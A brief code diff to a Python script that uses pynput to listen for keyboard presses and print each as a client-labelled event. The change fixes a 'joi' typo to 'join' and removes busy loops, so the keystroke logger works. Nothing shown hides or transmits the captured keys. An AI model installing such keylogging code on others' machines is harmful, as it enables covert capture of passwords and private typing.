@@ -16,9 +16,7 @@ def main():
         print(f"{clientid} => [{str(event)}]")
 
     with pynput.keyboard.Listener(on_press=client) as keyboardlogger:
-        keyboardlogger.joi()
-        while True:pass
-    while True:pass
+        keyboardlogger.join()
 
 if __name__=="__main__":
     while True:
